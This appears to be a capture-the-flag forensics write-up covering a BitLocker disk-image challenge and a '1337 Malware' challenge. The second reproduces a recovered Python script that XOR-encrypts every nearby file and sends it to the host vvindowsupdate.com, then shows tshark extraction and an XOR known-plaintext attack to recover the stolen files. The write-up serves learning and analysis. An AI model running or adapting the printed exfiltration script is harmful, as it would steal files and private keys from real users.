# forensics

## Breath of the wild
> Solved by : thewhiteh4t


- We are given a file without extension, running file command on it shows that its a VHDX file :

```
> file breath-of-the-wild
breath-of-the-wild: Microsoft Disk Image eXtended, by Microsoft Windows 10.0.22631.0, sequence 0xa; LOG; region, 2 entries, id BAT, at 0x300000, Required 1, id Metadata, at 0x200000, Required 1
```

- fastest way to access the disk file is by mounting it in windows, it is bitlocker enabled and we are given a password : `videogames`
- after unlock we can see about 100 wallpapers, the challenge description hints at finding website from where these are downloaded


![](https://i.imgur.com/ntLt6eT.png)



- using `Autopsy` we can automatically get a list of web locations for each file in a matter of seconds : 


![](https://i.imgur.com/OzxcGPt.png)



- one of the URL is using a different domain and it has some extra data which can be decoded in CyberChef : 


![](https://i.imgur.com/1PvaIro.png)



----------


## 1337 Malware
> Solved by : thewhiteh4t


- From the PCAP we can extract `rans.py` by exporting HTTP objects

```python
import socket
import base64
import os
from random import randbytes
from pwn import xor

# DON'T FORGET TO CHANGE THIS TO THE REAL KEY!!!!
key = randbytes(32)


def encrypt(filename):
    f = open(filename, 'rb')
    data = f.read()
    f.close()

    encrypted = xor(data, key)
    return encrypted


def send_encrypted(filename):
    print(f'sending {filename}')
    data = encrypt(filename)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall((f'Sending: {filename}').encode())
    s.close()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('vvindowsupdate.com', 1337))
    s.sendall(data)
    s.close()


def get_all_files():
    file_paths = []
    for root, dirs, files in os.walk(os.path.dirname(os.path.realpath(__file__))):
        for file in files:
            file_paths.append(os.path.join(root, file))
    file_paths.remove(__file__)
    return file_paths


files = get_all_files()
for f in files:
    send_encrypted(f)
    # os.remove(f)
```


- script generates a random key using randbytes function
- list of all files is generated and each file is passed to `send_encrypted` function
- it encrypts or encodes each file using XOR against the random key


![](https://i.imgur.com/nVmsdt6.png)



- then it first sends a message with the filename in plaintext and second it sends the encoded string


![](https://i.imgur.com/PGkqdW5.png)



- we can extract all this data to a file using `tshark` :

```
tshark -r 1337-malware.pcapng -T fields -e data.data -Y 'data.data' > enc_strings.txt
```

- since the plain text message has a fixed pattern and it begins by `Sending` the hex string remains constant so we can filter out the plain text message using start of the string : `53656e`
- each hex string of plain text message starts with it, so the full pattern is like :

```
sending file
<XORed data in hex>
.
.
.
sending file
<XORed data in hex>
```

- now we don’t have the key and the key is not sent by the script either
- after some google fu I found : `XOR Known Plaintext Attack`
- https://blog.didierstevens.com/2016/01/01/xor-known-plaintext-attack/
- if we decode only the plaintext hex strings we can see the filenames :

```
Sending: /home/davey/Documents/resources.zip
Sending: /home/davey/Documents/ecorp.png
Sending: /home/davey/Documents/Welcome Aboard.pdf
Sending: /home/davey/Documents/.ssh/id_rsa
Sending: /home/davey/Documents/.ssh/id_rsa.pub
```

- for parsing the data extracted from PCAP we can use the following python code :

```python
with open('enc_strings.txt', 'r') as infile:
        lines = infile.read()

chunks = lines.split('53656e')

for entry in chunks:
        parts = entry.split('\n')
        if len(parts) > 1:
                bin_data = b''
                for chunk in parts:
                        if parts.index(chunk) == 0:
                                sendline = bytes.fromhex('53656e' + chunk).decode()
                                filename = 'enc_' + sendline.split('/')[-1]
                        else:
                                bin_data += bytes.fromhex(chunk)
                print(f'Writing : {filename}')
                with open(filename, 'wb') as outfile:
                        outfile.write(bin_data)
                decrypt_file(filename)
```

- now if we think about known plain text in these files, for ZIP, PNG and PDF we don’t have much data except their headers
- but for `id_rsa` the first line is standard and is present in all valid keys :

```
-----BEGIN OPENSSH PRIVATE KEY-----
```

- using this with `xor-kpa.py` we can attempt to find the key


![](https://i.imgur.com/V6VrZrZ.png)



- we only need the first key
- now we can write a decode function to get the plain text file contents : 

```python
#!/usr/bin/env python3

from pwn import xor

key = b"\x82\xc2SP\x8b\xd5LG\xa7\xe5m\xec\xd8v\xb5\xd6\xa4\'\xc6E\t\x0br\xe1\xb9q3\"\xfe\xe1YY"


def decrypt_file(filename):
        print(f'Decoding : {filename}')
        with open(filename, 'rb') as encfile:
                data = encfile.read()
        decrypted = xor(data, key)
        orig_fname = filename.replace('enc_', '')
        print(f'Writing : {orig_fname}')
        with open(orig_fname, 'wb') as decfile:
                decfile.write(decrypted)


with open('enc_strings.txt', 'r') as infile:
        lines = infile.read()

chunks = lines.split('53656e')

for entry in chunks:
        parts = entry.split('\n')
        if len(parts) > 1:
                bin_data = b''
                for chunk in parts:
                        if parts.index(chunk) == 0:
                                sendline = bytes.fromhex('53656e' + chunk).decode()
                                filename = 'enc_' + sendline.split('/')[-1]
                        else:
                                bin_data += bytes.fromhex(chunk)
                print(f'Writing : {filename}')
                with open(filename, 'wb') as outfile:
                        outfile.write(bin_data)
                decrypt_file(filename)
```


- `resources.zip` is password protected
- `ecorp.png` is a reference to our beloved Mr Robot!
- `Welcome Aboard.pdf` contains the following content : 


![](https://i.imgur.com/uEQWs66.png)

- and we now have the password for the zip file!


![](https://i.imgur.com/BFgBtLB.png)


